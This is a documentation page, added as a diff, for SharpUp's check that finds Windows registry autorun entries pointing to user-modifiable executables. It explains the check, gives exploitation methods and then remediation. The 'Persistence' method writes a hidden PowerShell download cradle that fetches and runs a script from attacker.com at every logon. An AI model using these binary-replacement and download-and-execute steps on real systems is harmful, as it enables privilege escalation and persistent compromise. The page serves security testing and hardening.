@@ -1,0 +1,127 @@
+---
+title: 'Registry Autoruns'
+description: 'Modifiable autorun registry entries'
+icon: 'list'
+---
+
+## Overview
+
+The Registry Autoruns check identifies registry entries that automatically execute programs at system startup or user logon, where the executable files have weak permissions. This allows an attacker to replace legitimate autorun binaries with malicious ones for privilege escalation or persistence.
+
+## How It Works
+
+SharpUp checks multiple autorun registry locations:
+
+**HKLM Locations:**
+- `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+- `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
+- `SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
+- `SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
+- `SOFTWARE\Microsoft\Windows\CurrentVersion\RunService`
+- `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService`
+- `SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService`
+- `SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService`
+
+For each entry:
+1. Extracts the executable path using regex
+2. Checks if the current user can modify the executable
+3. Reports modifiable autorun binaries
+
+## Example Output
+
+```
+=== Modifiable Registry AutoRun Files ===
+    HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run : C:\Tools\startup.exe
+    HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run : C:\Apps\monitor.bat
+```
+
+## Exploitation
+
+### Method 1: Replace Autorun Binary
+
+```powershell
+# Backup original
+$autorunPath = "C:\Tools\startup.exe"
+Copy-Item $autorunPath "$autorunPath.bak"
+
+# Replace with malicious binary
+Copy-Item C:\temp\malicious.exe $autorunPath -Force
+
+# Wait for system restart or user logon
+# Malicious code executes automatically
+```
+
+### Method 2: Persistence
+
+```powershell
+# Create backdoor that runs at every logon
+$payload = @"
+@echo off
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+"@
+
+$payload | Out-File -FilePath "C:\Tools\startup.bat" -Encoding ASCII
+
+# Executes every time any user logs on
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Modifiable Autoruns">
+    ```powershell
+    $runKeys = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+    )
+
+    foreach ($key in $runKeys) {
+        Get-ItemProperty $key | Get-Member -MemberType NoteProperty |
+        Where-Object { $_.Name -notmatch "PS" } | ForEach-Object {
+            $name = $_.Name
+            $value = (Get-ItemProperty $key).$name
+
+            if ($value -match '(.+\.exe|.+\.bat|.+\.ps1)') {
+                $exePath = $matches[1].Trim('"')
+                if (Test-Path $exePath) {
+                    $acl = Get-Acl $exePath
+                    Write-Host "Checking: $name -> $exePath"
+                }
+            }
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Secure Autorun Binaries">
+    ```powershell
+    # Fix permissions on autorun executable
+    $exePath = "C:\Tools\startup.exe"
+
+    icacls $exePath /reset
+    icacls $exePath /inheritance:r
+    icacls $exePath /grant:r "SYSTEM:F"
+    icacls $exePath /grant:r "Administrators:F"
+    icacls $exePath /grant:r "Users:RX"
+    ```
+  </Step>
+
+  <Step title="Remove Unnecessary Autoruns">
+    ```powershell
+    # Review and remove unnecessary autorun entries
+    $key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    Remove-ItemProperty -Path $key -Name "UnnecessaryApp"
+    ```
+  </Step>
+</Steps>
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Hijackable Paths" icon="route" href="/ghostpack-docs/SharpUp-mdx/checks/hijackablepaths">
+    Writable folders in system PATH
+  </Card>
+  <Card title="Modifiable Scheduled Task" icon="clock" href="/ghostpack-docs/SharpUp-mdx/checks/modifiablescheduledtask">
+    Scheduled tasks with weak permissions
+  </Card>
+</CardGroup>
